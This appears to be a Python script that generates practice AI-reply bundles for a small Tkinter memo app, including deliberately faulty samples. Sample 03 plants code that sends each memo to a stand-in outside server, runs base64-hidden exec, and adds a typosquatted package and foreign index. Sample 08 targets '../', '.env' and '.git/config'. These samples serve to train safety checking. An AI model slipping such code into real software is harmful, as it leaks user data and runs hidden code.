"""練習用の「Copilot の返信」を作る。  uv run python tools/make_samples.py

小さな Tk アプリ「ひとことメモ」が育っていく様子と、うまくいかない返信の見本を、AIBundle（.md）で
samples/replies/ に書き出す。本物の Copilot Chat が無くても、受け取る→確かめる→反映→動かす→戻す を
練習できる（アプリの「サンプルで練習する」から使う）。sha256 は本当に計算して付けている。
"""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"
PROJECT = "ひとことメモ"


def sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def frame(boundary: str, files: dict[str, str], deletes=(), mode="patch", part: str | None = None, bad_sha=(), no_sha=()) -> str:
    p = f' part="{part}"' if part else ""
    out = [f'<<<AIBUNDLE {boundary} version="1" mode="{mode}" project="{PROJECT}"{p}>>>']
    for path, text in files.items():
        attrs = "" if path in no_sha else f' sha256="{"0" * 64 if path in bad_sha else sha(text)}"'
        out += [f'<<<FILE {boundary} path="{path}"{attrs}>>>', text.rstrip("\n"), f"<<<END FILE {boundary}>>>"]
    out += [f'<<<DELETE {boundary} path="{d}">>>' for d in deletes]
    out.append(f'<<<END AIBUNDLE {boundary}{(" part=" + chr(34) + part + chr(34)) if part else ""}>>>')
    return "\n".join(out) + "\n"


def reply(intro: str, body: str, outro: str) -> str:
    return f"{intro}\n\n{body}\n{outro}\n"


# ---------------------------------------------------------------- アプリの中身
PYPROJECT = '''[project]
name = "hitokoto-memo"
version = "0.1.0"
description = "ひとことメモ"
requires-python = "==3.12.*"
dependencies = []

[tool.uv]
package = false
'''

STORE = '''"""メモの保存と読み込み（画面と分けてあるので、テストできる）。"""
from __future__ import annotations

import json
import os
from datetime import datetime
from pathlib import Path


def default_path() -> Path:
    base = os.environ.get("LOCALAPPDATA") or str(Path.home())
    return Path(base) / "ひとことメモ" / "memos.json"


def load_memos(path: Path | None = None) -> list[dict]:
    p = path or default_path()
    if not p.is_file():
        return []
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return []
    return [m for m in data if isinstance(m, dict) and "text" in m]


def add_memo(memos: list[dict], text: str, now: datetime | None = None) -> list[dict]:
    """新しいメモを先頭に足す。空のときは何もしない。"""
    text = text.strip()
    if not text:
        return memos
    now = now or datetime.now()
    return [{"text": text, "time": now.strftime("%Y-%m-%d %H:%M")}] + memos


def delete_memo(memos: list[dict], index: int) -> list[dict]:
    if 0 <= index < len(memos):
        return memos[:index] + memos[index + 1:]
    return memos


def save_memos(memos: list[dict], path: Path | None = None) -> None:
    p = path or default_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    tmp = p.with_suffix(".tmp")
    tmp.write_text(json.dumps(memos, ensure_ascii=False, indent=2), encoding="utf-8")
    tmp.replace(p)
'''

STORE_SEARCH = STORE + '''

def search_memos(memos: list[dict], word: str) -> list[dict]:
    """ことばを含むメモだけを返す（大文字・小文字は区別しない）。"""
    w = word.strip().lower()
    if not w:
        return memos
    return [m for m in memos if w in m["text"].lower()]
'''

TEST_STORE = '''import tempfile
import unittest
from datetime import datetime
from pathlib import Path

from memo_store import add_memo, delete_memo, load_memos, save_memos


class MemoStoreTest(unittest.TestCase):
    def test_add_puts_newest_first(self):
        a = add_memo([], "一つ目", datetime(2026, 10, 1, 9, 0))
        b = add_memo(a, "二つ目", datetime(2026, 10, 2, 9, 0))
        self.assertEqual([m["text"] for m in b], ["二つ目", "一つ目"])

    def test_empty_text_is_ignored(self):
        self.assertEqual(add_memo([], "   "), [])

    def test_save_and_load(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "m.json"
            save_memos(add_memo([], "こんにちは"), p)
            self.assertEqual(load_memos(p)[0]["text"], "こんにちは")

    def test_broken_file_gives_empty(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "m.json"
            p.write_text("これは壊れたファイル", encoding="utf-8")
            self.assertEqual(load_memos(p), [])

    def test_delete(self):
        m = add_memo(add_memo([], "a"), "b")
        self.assertEqual([x["text"] for x in delete_memo(m, 0)], ["a"])
        self.assertEqual(delete_memo(m, 9), m)


if __name__ == "__main__":
    unittest.main()
'''

TEST_SEARCH = '''import unittest

from memo_store import search_memos


class SearchTest(unittest.TestCase):
    MEMOS = [{"text": "牛乳を買う", "time": "x"}, {"text": "Mail を返す", "time": "x"}]

    def test_finds_word(self):
        self.assertEqual(len(search_memos(self.MEMOS, "牛乳")), 1)

    def test_ignores_case(self):
        self.assertEqual(len(search_memos(self.MEMOS, "mail")), 1)

    def test_empty_word_returns_all(self):
        self.assertEqual(len(search_memos(self.MEMOS, "")), 2)


if __name__ == "__main__":
    unittest.main()
'''


def main_py(font_buttons: bool = False, search: bool = False, import_line: str = "from memo_store import add_memo, delete_memo, load_memos, save_memos",
            extra_imports: str = "", on_add_extra: str = "") -> str:
    sizes = '''
        bar2 = tk.Frame(self)
        bar2.pack(fill="x", padx=16)
        tk.Button(bar2, text="文字を大きく", font=self.font, command=lambda: self.change_size(2)).pack(side="left")
        tk.Button(bar2, text="文字を小さく", font=self.font, command=lambda: self.change_size(-2)).pack(side="left", padx=8)
''' if font_buttons else ""
    change = '''
    def change_size(self, step: int) -> None:
        self.font.configure(size=max(10, min(40, self.font.cget("size") + step)))
''' if font_buttons else ""
    search_ui = '''
        self.word = tk.StringVar()
        row = tk.Frame(self)
        row.pack(fill="x", padx=16, pady=(8, 0))
        tk.Label(row, text="さがす：", font=self.font).pack(side="left")
        tk.Entry(row, textvariable=self.word, font=self.font).pack(side="left", fill="x", expand=True)
        self.word.trace_add("write", lambda *_: self.refresh())
''' if search else ""
    shown = "search_memos(self.memos, self.word.get())" if search else "self.memos"
    return f'''"""ひとことメモ: 思いついたことを、ひとこと書いて残すアプリ"""
import tkinter as tk
from tkinter import font as tkfont
from tkinter import messagebox

{import_line}
{extra_imports}

class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("ひとことメモ")
        self.geometry("600x600")
        self.font = tkfont.Font(family="Yu Gothic UI", size=16)
        self.memos = load_memos()
        tk.Label(self, text="ひとこと書いてください", font=self.font).pack(anchor="w", padx=16, pady=(16, 4))
        self.entry = tk.Text(self, height=4, font=self.font, wrap="word")
        self.entry.pack(fill="x", padx=16)
        bar = tk.Frame(self)
        bar.pack(fill="x", padx=16, pady=8)
        tk.Button(bar, text="残す", font=self.font, command=self.on_add).pack(side="left")
        tk.Button(bar, text="選んだメモを消す", font=self.font, command=self.on_delete).pack(side="left", padx=8){sizes}{search_ui}
        self.listbox = tk.Listbox(self, font=self.font, activestyle="none")
        self.listbox.pack(fill="both", expand=True, padx=16, pady=(8, 16))
        self.refresh()
{change}
    def shown(self) -> list:
        return {shown}

    def refresh(self) -> None:
        self.listbox.delete(0, "end")
        for m in self.shown():
            self.listbox.insert("end", m["time"] + "  " + m["text"].splitlines()[0])

    def on_add(self) -> None:
        text = self.entry.get("1.0", "end").strip()
        if not text:
            messagebox.showinfo("ひとことメモ", "何か書いてください")
            return
        self.memos = add_memo(self.memos, text)
        save_memos(self.memos){on_add_extra}
        self.entry.delete("1.0", "end")
        self.refresh()

    def on_delete(self) -> None:
        sel = self.listbox.curselection()
        if not sel:
            messagebox.showinfo("ひとことメモ", "消したいメモを選んでください")
            return
        shown = self.shown()
        target = shown[sel[0]]
        self.memos = delete_memo(self.memos, self.memos.index(target))
        save_memos(self.memos)
        self.refresh()


if __name__ == "__main__":
    App().mainloop()
'''


def roadmap(done: list[tuple[str, str]], todo: list[tuple[str, str]]) -> str:
    def line(box, t, i, v): return f"- [{box}] {t} @{v} ^{i}"
    d = "\n".join(line("x", t, i, "v0.1") for t, i in done)
    t = "\n".join(line(" ", x, i, "v0.2") for x, i in todo)
    return f"# ロードマップ\n\nこの表は、人も AI も読み書きします。形を崩さないでください。\n\n## 📥 やること\n{t}\n\n## 🚧 進行中\n\n## ✅ できた\n{d}\n"


CHANGELOG1 = "# 変更の記録\n\n## 2026-10-18\n- ひとことメモを作った（メモを書く・残す・消す、保存）\n"
CHANGELOG2 = CHANGELOG1.replace("# 変更の記録\n\n", "# 変更の記録\n\n## 2026-10-19\n- 文字の大きさを変えられるようにした\n\n")


def samples() -> list[dict]:
    S = []

    def add(num, slug, title, desc, expect, texts):
        S.append({"id": num, "title": title, "description": desc, "expect": expect, "texts": texts, "slug": slug})

    # 01 初回
    v1 = main_py()
    add("01", "初回の返信", "最初の返信（ひとことメモができた）",
        "新しいアプリを頼んだときに、Copilot が最初に返してくれる想定の返信です。メモを書いて残すだけの、小さな Tk アプリです。",
        "指紋は全部一致。赤い警告は出ません。反映して「動かす」と、メモの窓が開きます。",
        [reply("ひとことメモを作りました。メモを書いて、残して、消せます。テストも付けました（5件通りました）。",
               frame("a1b2c3d4", {"pyproject.toml": PYPROJECT, "memo_store.py": STORE, "main.py": v1, "tests/test_memo_store.py": TEST_STORE,
                                   ".ai/roadmap.md": roadmap([("メモを書いて残す", "t-001"), ("メモを消す", "t-002")], [("文字を大きくできるようにする", "t-003"), ("メモをさがせるようにする", "t-004")]),
                                   ".ai/CHANGELOG.md": CHANGELOG1}, mode="full"),
               "【人が確かめる手順】\n1. 「動かす」を押す → 窓が開く\n2. 「ひとこと」を書いて「残す」を押す → 下の一覧に出る\n3. 何も書かずに「残す」→ 「何か書いてください」と出る")])

    # 02 追加（文字を大きく）
    v2 = main_py(font_buttons=True)
    add("02", "追加_文字を大きく", "機能の追加（文字を大きくできる）",
        "「文字を大きくしたい」と頼んだ想定の返信です。変わるのは 2 ファイルだけ（変更分だけの返信）。",
        "差分で、足された行（緑）が見えます。赤い警告は出ません。",
        [reply("文字の大きさを変えるボタンを足しました。", frame("b2c3d4e5", {"main.py": v2, ".ai/roadmap.md": roadmap(
            [("メモを書いて残す", "t-001"), ("メモを消す", "t-002"), ("文字を大きくできるようにする", "t-003")], [("メモをさがせるようにする", "t-004")]), ".ai/CHANGELOG.md": CHANGELOG2}),
            "【人が確かめる手順】\n「文字を大きく」を押す → 文字が大きくなる。「文字を小さく」で戻る。")])

    # 03 危険
    danger_main = main_py(font_buttons=True, extra_imports="import base64\nimport os\n\nimport requests\n",
                          on_add_extra='\n        requests.post("https://paste.example.net/upload", data={"memo": text})  # バックアップのつもり\n        os.system("start https://paste.example.net/view")\n        exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk=").decode())')
    danger_pp = PYPROJECT.replace("dependencies = []", 'dependencies = ["requests", "reqeusts"]') + '\n[[tool.uv.index]]\nurl = "https://pypi.example.net/simple"\n'
    add("03", "危険な処理", "危険な処理が入った返信（赤の練習）",
        "「バックアップしたい」と頼んだら、メモを外のサーバへ勝手に送る処理や、隠したコマンドが入ってしまった想定です。",
        "赤い警告が出ます。「直してもらう」が主ボタンになり、依頼文が作られます。そのまま反映はおすすめしません。",
        [reply("メモを自動でバックアップするようにしました。", frame("c3d4e5f6", {"main.py": danger_main, "pyproject.toml": danger_pp}), "以上です。")])

    # 04 途中が省かれた
    trunc = STORE.split("def delete_memo")[0] + "# …（以下、前と同じ）\n"
    add("04", "途中が省かれた", "途中が省かれた返信（指紋が合わない）",
        "長いファイルを、Copilot が「…以下同じ」と省いてしまった想定です。",
        "「指紋が合わない」と出て、反映できません。「省かれたファイルを書き直してもらう」依頼が作れます。",
        [reply("メモの保存を少し直しました。", frame("d4e5f607", {"memo_store.py": trunc}, bad_sha=("memo_store.py",)), "以上です。")])

    # 05 分割（2つ）
    v3 = main_py(font_buttons=True, search=True, import_line="from memo_store import add_memo, delete_memo, load_memos, save_memos, search_memos")
    p1 = reply("メモをさがせるようにしました。大きいので 2 つのファイルに分けます（1/2）。",
               frame("e5f60718", {"memo_store.py": STORE_SEARCH, "main.py": v3}, part="1/2"), "（つづく）")
    p2 = reply("（2/2）テストと記録です。",
               frame("e5f60718", {"tests/test_search.py": TEST_SEARCH, ".ai/roadmap.md": roadmap(
                   [("メモを書いて残す", "t-001"), ("メモを消す", "t-002"), ("文字を大きくできるようにする", "t-003"), ("メモをさがせるようにする", "t-004")], []),
                   ".ai/CHANGELOG.md": CHANGELOG2.replace("# 変更の記録\n\n", "# 変更の記録\n\n## 2026-10-20\n- メモをさがせるようにした\n\n")}, part="2/2"), "以上です。")
    add("05", "分割", "大きくて 2 つに分かれた返信",
        "返信が大きくて、2 つのファイルに分かれた想定です（5MB を超えるとリンクが壊れるので、分けてもらいます）。",
        "2 つ両方を置くと、1 つの返信としてまとめて読めます。片方だけだと「あと 1 個足りません」と出ます。",
        [p1, p2])

    # 06 エラー
    bad_main = main_py(font_buttons=True, import_line="from memo_store import add_memo, delete_memo, load_all, save_memos")
    add("06", "動かすとエラー", "動かすとエラーになる返信（直してもらう練習）",
        "指紋も安全チェックも問題ないのに、動かすとエラーで止まる想定です（存在しない関数 load_all を呼んでいる）。",
        "反映は通ります。「動かす」を押すとエラーで止まり、「このエラーを直してもらう依頼にする」が出ます。",
        [reply("読み込みの部分を整理しました。", frame("f6071829", {"main.py": bad_main}), "以上です。")])

    # 07 直した返信
    add("07", "エラーを直した", "エラーを直した返信",
        "06 のエラーを、Copilot が直して返した想定です。",
        "反映して「動かす」と、ちゃんと動きます。履歴には、直す前・直した後が残ります。",
        [reply("原因は、存在しない関数 load_all を呼んでいた事でした。load_memos に直し、同じ間違いを防ぐテストを足しました。",
               frame("07182930", {"main.py": v2}), "以上です。")])

    # 08 受け取れない
    add("08", "書けない場所", "書き込めない場所を指した返信",
        "Copilot が、プロジェクトの外や、秘密のファイルを書き換えようとした想定です。",
        "「拒否」と出て、反映できません。手元の秘密のファイルは、絶対に書き換わりません。",
        [reply("設定ファイルも直しました。", frame("18293a4b", {
            "../evil.py": "print('外に書く')\n", ".env": "API_KEY=<<MASKED>>\n", ".git/config": "[core]\n", "C:/Windows/x.py": "x = 1\n", "ok.py": "print('これは普通のファイル')\n"}), "以上です。")])
    return S


def main() -> None:
    rep = OUT / "replies"
    rep.mkdir(parents=True, exist_ok=True)
    for old in rep.glob("*.md"):
        old.unlink()
    index = []
    for s in samples():
        files = []
        for i, text in enumerate(s["texts"], 1):
            suffix = f".part{i}of{len(s['texts'])}" if len(s["texts"]) > 1 else ""
            name = f"{s['id']}_{s['slug']}{suffix}.aibundle.md"
            (rep / name).write_text(text, encoding="utf-8", newline="\n")
            files.append(name)
        index.append({"id": s["id"], "title": s["title"], "description": s["description"], "expect": s["expect"], "files": files})
    (OUT / "index.json").write_text(json.dumps(index, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"{len(index)} 種類（{sum(len(i['files']) for i in index)} ファイル）を {rep} に書きました")


if __name__ == "__main__":
    main()
